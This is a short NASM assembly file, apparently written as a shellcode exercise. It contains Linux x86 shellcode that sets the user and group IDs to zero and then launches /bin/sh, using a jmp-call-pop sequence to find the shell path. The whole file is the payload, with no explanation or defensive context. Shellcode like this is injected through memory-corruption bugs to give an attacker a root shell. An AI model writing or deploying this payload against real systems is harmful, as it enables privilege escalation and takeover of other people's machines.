; File: shellcode_2_setuid_gid_sh.nasm
; Author: Petr Javorik

global _start

section .text

_start:

        jmp short getdata

run:

        xor eax,eax
        mov al,0x17
        xor ebx,ebx
        int 0x80

        xor eax,eax
        mov al,0x2e
        xor ebx,ebx
        int 0x80

        xor eax,eax
        mov al,0xb
        pop ebx
        mov ecx,edx
        int 0x80

getdata:

        call run
        data db "/bin/sh"
